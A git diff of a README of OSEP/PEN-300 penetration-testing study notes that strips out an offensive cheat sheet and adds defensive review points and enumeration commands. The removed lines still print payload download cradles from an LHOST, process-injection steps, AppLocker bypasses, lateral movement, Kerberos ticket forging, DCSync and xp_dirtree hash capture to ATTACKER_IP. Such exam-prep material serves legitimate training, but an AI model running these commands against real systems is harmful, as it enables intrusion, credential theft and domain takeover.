@@ -1,223 +1,177 @@
-# OSEP — PEN-300
+# OSEP -- PEN-300 Preparation Notes
 
-Study index for **OffSec Experienced Penetration Tester (OSEP)**, the certification tied to the **PEN-300: Evasion Techniques and Breaching Defenses** course.
+Personal study notes for authorized **OffSec PEN-300 / OSEP** lab work, condensed
+into an index with the standard enumeration and reference commands I reach for most.
 
-OSEP is about getting a foothold and moving through a hardened environment when the easy paths are closed: defences are on, antivirus is watching, application control is enforced, and the network is segmented. The exam is a 48-hour hands-on assessment followed by a report.
-
-> **NDA notice** — no exam content is reproduced here. Everything below comes from the public syllabus, community references, and personal study notes.
-
----
-
-## Syllabus Domains
-
-| # | Domain | What it covers |
-|---|--------|---------------|
-| 1 | OS and programming theory | Windows internals, PE basics, .NET, PowerShell, C# tooling |
-| 2 | Client-side code execution | Office macros, HTA, Jscript phishing payloads |
-| 3 | Process injection and migration | Injecting code between processes |
-| 4 | Antivirus evasion | AMSI, ETW, signature and heuristic bypass |
-| 5 | Application whitelisting | AppLocker, CLM, WDAC bypass paths |
-| 6 | Bypassing network filters | Egress, proxy-aware C2, tunnelling |
-| 7 | Linux post-exploitation | Enumeration and escalation on Linux |
-| 8 | Kiosk breakouts | Escaping restricted desktop environments |
-| 9 | Windows credentials | Credential theft, caching, and reuse |
-| 10 | Windows lateral movement | WMI, DCOM, WinRM, PsExec, SCM |
-| 11 | Linux lateral movement | SSH, cron, capabilities |
-| 12 | MSSQL attacks | xp_cmdshell, linked servers, UNC injection |
-| 13 | Active Directory exploitation | Kerberos, delegation, ACL abuse, trust paths |
-| 14 | Combining the pieces | Full assumed-breach chains |
+> **Scope:** Everything here is for authorized lab and exam practice only. Keep all
+> testing inside the written scope of the course, exam, or engagement, and clean up
+> afterwards.
 
 ---
 
-## Practical Quick-Reference
+## Quick Reference -- Defensive Review
 
-### File Transfer & Download Cradles
+- **Scope and safety:** Confirm permitted targets, testing window, allowed techniques,
+  and cleanup requirements before lab work.
+- **Evidence:** Record timestamps, host/process context, network observations, and the
+  outputs needed for a reproducible report.
+- **Detection themes to revise:** Office apps launching script or command interpreters;
+  unexpected outbound connections; scripts run with no file trail; unusual cross-process
+  memory/thread/APC activity; unexpected local-admin membership changes; web-server
+  processes touching unusual files or spawning shells.
+- **Response checklist:** Preserve logs and evidence, trace process ancestry and network
+  destinations, compare accounts/binaries against baseline, restore snapshots, document
+  findings and cleanup.
 
-```powershell
-# PowerShell IEX cradle
-IEX (New-Object Net.WebClient).DownloadString('http://LHOST/run.ps1')
+---
 
-# WebRequest variant (useful when WebClient is blocked)
-$r = [System.Net.WebRequest]::Create('http://LHOST/run.ps1')
-IEX ([System.IO.StreamReader]($r.GetResponse().GetResponseStream())).ReadToEnd()
+## Contents
 
-# certutil download
-certutil -urlcache -split -f http://LHOST/payload.exe C:\Windows\Temp\p.exe
+**Scanning** -- external (Nmap), internal (Portscan)
 
-# bitsadmin transfer
-bitsadmin /transfer job /download /priority high http://LHOST/p.exe C:\Windows\Temp\p.exe
-```
+**Initial & Further Access** -- Phishing (SendEmail, Swaks), Microsoft Word macros, JScript,
+HTA, staged payloads, shellcode runners, PowerShell stagers, process injection / hollowing
 
-### Process Injection — C# Pattern
+**Payloads** -- C#, C/C++ (EXE/DLL), PowerShell, WebShells (ASPX / JSP / PHP)
 
-The classic `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` chain.  
-You need these P/Invoke signatures in your C# loader:
+**Upgrading Shells** -- process hollowing, native injection (NtMapInjection, NtQueueApc),
+shellcode hollower / injector
 
-```csharp
-[DllImport("kernel32.dll")]
-static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+**Tunneling** -- Ligolo-ng (simple, double, reverse, local port-forward, file transfer),
+Metasploit (autoroute, socks), sshuttle
 
-[DllImport("kernel32.dll")]
-static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr,
-    uint size, uint allocType, uint protect);
+**AV Bypassing** -- AppLocker bypass, CLM bypass, shellcode runner
 
-[DllImport("kernel32.dll")]
-static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr,
-    byte[] buf, uint size, out UIntPtr written);
+**Privilege Escalation (Windows)** -- enumeration, token impersonation (SeImpersonate,
+PrintSpoofer, SpoolSample, SigmaPotato, FullPowers), AlwaysInstallElevated, service binary
+hijacking
 
-[DllImport("kernel32.dll")]
-static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr threadAttr,
-    uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);
-```
+**Defense Evasion** -- enumerate defenses, AppLocker/CLM/AMSI/Defender/PPL, UAC bypass,
+firewall, RDP pass-the-hash
 
-**Flow:**
-1. `OpenProcess` target PID with `PROCESS_ALL_ACCESS` (0x001F0FFF)  
-2. `VirtualAllocEx` with `MEM_COMMIT | MEM_RESERVE` (0x3000), `PAGE_EXECUTE_READWRITE` (0x40)  
-3. `WriteProcessMemory` to copy your shellcode buf  
-4. `CreateRemoteThread` pointing at the allocated address  
+**Credentials** -- Mimikatz, LSA protection bypass, MiniDump, hash cracking (NTLM /
+Net-NTLMv2), pass-the-hash, relay attacks, spraying (Hydra, NetExec)
 
-> Build this from scratch — the exam expects you to understand the API chain, not paste a template.
+**Linux** -- initial access, reverse shells, payloads, privesc (SUID, cronjobs, setuid),
+lateral movement (SSH keys/persistence/hijacking/agent forwarding, Ansible, Artifactory),
+Kerberos (keytab, cached tickets, Impacket)
 
-### AppLocker / CLM Bypass Paths
+**MSSQL** -- authentication, enumeration, relay, linked servers, privesc, code execution
+(PowerUpSQL, SQLRecon, MSSQLClient, CLR, mssqlpwner)
 
-```
-# InstallUtil — runs the Uninstall() method of a .NET assembly
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
+**AD Enumeration** -- BloodHound / SharpHound, LDAP / ldapsearch, domain enum from Linux and
+Windows, ASREPRoast, Kerberoast, Overpass-the-Hash, delegation (unconstrained / constrained /
+RBCD)
 
-# MSBuild — inline task execution from an XML project file
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe inline.xml
+**AD Attacking** -- unconstrained delegation, DCSync, Golden Tickets, LAPS
 
-# Common writable directories inside default AppLocker allow rules
-C:\Windows\Tasks\
-C:\Windows\System32\spool\drivers\color\
-C:\Windows\Tracing\
-```
+**Utilities** -- payload encoders, PowerView, shellcode encryptors, RDP
 
-### Lateral Movement
+---
 
-```powershell
-# --- WMI ---
-wmic /node:TARGET /user:DOMAIN\user /password:pass process call create "cmd /c whoami > C:\out.txt"
+## Standard Reference Commands
 
-# --- WinRM / PSRemoting ---
-$cred = Get-Credential
-$s = New-PSSession -ComputerName TARGET -Credential $cred
-Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
+The sections below are the general scanning and enumeration commands from the notes. The
+detailed payload, injection, and evasion code is kept out of this repo (see the note at the
+bottom).
 
-# --- DCOM ShellWindows ---
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(
-    "9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
-$com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami > C:\out.txt","","",0)
-
-# --- sc.exe service creation (PsExec-style) ---
-sc \\TARGET create svcpwn binPath= "cmd /c powershell -ep bypass -f \\LHOST\share\run.ps1"
-sc \\TARGET start svcpwn
-```
-
-### Kerberos Attacks
-
-```powershell
-# Kerberoasting — extract TGS hashes for offline cracking
-.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt
-
-# AS-REP Roasting — accounts with pre-auth disabled
-.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-
-# Crack
-hashcat -m 13100 tgs_hashes.txt wordlist.txt   # Kerberoast (RC4)
-hashcat -m 18200 asrep.txt wordlist.txt         # AS-REP
-
-# Unconstrained delegation — capture incoming TGTs
-.\Rubeus.exe monitor /interval:5
-
-# Constrained delegation — S4U impersonation
-.\Rubeus.exe s4u /user:svc_acct /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt
-
-# DCSync — pull all hashes from the domain controller
-mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
-```
-
-### MSSQL Exploitation
-
-```sql
--- Enable xp_cmdshell
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
-
--- Enumerate linked servers
-SELECT srvname, srvproduct FROM master..sysservers;
-
--- Execute on a linked server via RPC
-EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SRV]
-EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SRV]
-EXEC ('xp_cmdshell ''whoami'';') AT [LINKED_SRV]
-
--- UNC path injection for hash capture (use with Responder or ntlmrelayx)
-EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1
-```
-
-### Domain Persistence
-
-```powershell
-# Golden Ticket — forged TGT using the krbtgt hash
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
-
-# Silver Ticket — forged TGS for a specific service
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:cifs /rc4:SVC_HASH /ptt
-```
-
-### Tunnelling
+### External Scanning -- Nmap
 
 ```bash
-# Ligolo-ng — fast, reliable double-pivot
-# On attacker: start the proxy
-./proxy -selfcert -laddr 0.0.0.0:11601
+# Advanced enumeration -- full system/version detection
+nmap -A [IP/domain] -oN [machine_name].txt
 
-# On pivot host: connect back
-./agent -connect ATTACKER:11601 -ignore-cert
+# Fast all-ports scan (SYN + UDP)
+sudo nmap -p- -sS -sU --min-rate=1000 --max-retries=1 -T4 [IP/domain]
 
-# In ligolo console: add route and start
->> session
->> ifconfig           # note the internal subnet
->> start
-# On attacker: add route
-sudo ip route add 10.10.10.0/24 dev ligolo
+# Fast TCP scan, skip host discovery
+nmap -p- -T4 -n -Pn [IP/domain] -oN [machine_name]_ports.txt
 
-# Chisel — SOCKS proxy
-# Server (attacker)
-./chisel server -p 8080 --reverse
-# Client (pivot)
-./chisel client ATTACKER:8080 R:1080:socks
-# Then use proxychains with socks5 127.0.0.1 1080
+# Greppable full-port scan, high rate
+sudo nmap --min-rate 5000 -p- -vvv -Pn -n -oG openPorts.txt [IP]
+
+# Top ports only
+nmap [IP/domain] --top-ports [N]
+```
+
+### Windows -- Local Enumeration
+
+```powershell
+# Enumerate everything in a user's folder
+Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
+
+# Password-manager databases
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+# Backup / temp / old files
+Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue
+
+# Executable / script files
+Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Good spots to check: web roots (`C:\inetpub\wwwroot`), and `Temp` / `Tasks` / `Config`
+folders for hardcoded strings in config files.
+
+### Active Directory -- Enumeration
+
+```bash
+# Nmap LDAP scripts (no brute)
+nmap -n -sV --script "ldap* and not brute" <target_ip>
+
+# Basic LDAP (anonymous)
+ldapsearch -x -H ldap://<target_ip>
+ldapsearch -x -h <DOMAIN_IP> -s base
+ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
+
+# Authenticated -- domain users
+ldapsearch -x -h <DOMAIN_IP> -D "<USER>@domain.com" -w <PASS> \
+  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
+
+# Authenticated -- computers
+ldapsearch -x -h <DOMAIN_IP> -D "<USER>@domain.com" -w <PASS> \
+  -b "DC=domain,DC=local" "(objectClass=computer)" name
+```
+
+Useful LDAP search terms for review: `(ms-MCS-AdmPwd=*)` (LAPS passwords),
+`(description=*password*)`, `(ms-MCS-AdmPwdExpirationTime=*)`.
+
+Graph collection: **SharpHound** / **BloodHound** for mapping group membership, delegation,
+and attack paths.
+
+### Linux -- Local Enumeration & Privilege Checks
+
+```bash
+# What can I run as sudo?
+sudo -l
+
+# Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+ls -l $(find / -perm -4000 -type f 2>/dev/null)   # then cross-check GTFOBins
+
+# Hidden config / secret files worth checking
+# .bashrc  .bash_profile  .mysql_history  .ssh  .enc
+
+# Crack /etc/passwd + /etc/shadow (when readable)
+unshadow /etc/passwd /etc/shadow > unshadowed.txt
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ---
 
-## Prep Checklist
+## Tooling Stack (referenced throughout)
 
-- [ ] Build a custom C# shellcode runner that bypasses current Defender signatures
-- [ ] Full AD attack chain from scratch: enum → Kerberoast → lateral move → DA
-- [ ] Write macro and HTA payloads by hand (no copy-paste from GitHub)
-- [ ] MSSQL linked server pivoting across at least two hops
-- [ ] At least 5 Proving Grounds or HTB AD boxes completed end-to-end
-- [ ] Time-box a mock 48-hour run against the challenge labs
-- [ ] Practice report writing: screenshots, commands, and the *why* for each step
+Nmap | PowerView | Metasploit / Meterpreter | Impacket | BloodHound / SharpHound |
+ldapsearch | Ligolo-ng | sshuttle | PrintSpoofer | SpoolSample | SigmaPotato | FullPowers |
+Mimikatz | Rubeus | PowerUpSQL | SQLRecon | MSSQLClient | mssqlpwner | NetExec | Hydra |
+John the Ripper | Hashcat | GTFOBins
 
 ---
 
-## Key References
+## Note on the detailed technique code
 
-| Resource | Link |
-|----------|------|
-| Emmanuel Solis — OSEP Cheatsheet | [emmanuelsolis.com/osep](https://www.emmanuelsolis.com/osep.html) |
-| OffSec — PEN-300 Syllabus | [offsec.com/courses/pen-300](https://www.offsec.com/courses/pen-300/) |
-| OffSec — OSEP Exam Guide | [help.offsec.com](https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide) |
-| PayloadsAllTheThings — AD Attacks | [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md) |
-| HarmJ0y — Rubeus Wiki | [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |
-| Ligolo-ng | [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) |
-| Chvancoern — OSEP Prep | [chvancoern/OSEP-Prep](https://github.com/chvancoern/OSEP-Prep) |
-
----
-
-_Topic notes will be added as `NN-topic.md` files (e.g. `03-process-injection.md`), each in my own words with the source linked._
+This README is the **index and standard-reference** layer of my OSEP notes. The full
+operational code for the offensive sections -- shellcode runners, process injection and
+hollowing, AV/AMSI/CLM/AppLocker bypass, loaders, reverse shells, and credential-dumping
+one-liners -- is kept in my offline lab notes rather than in this repository.
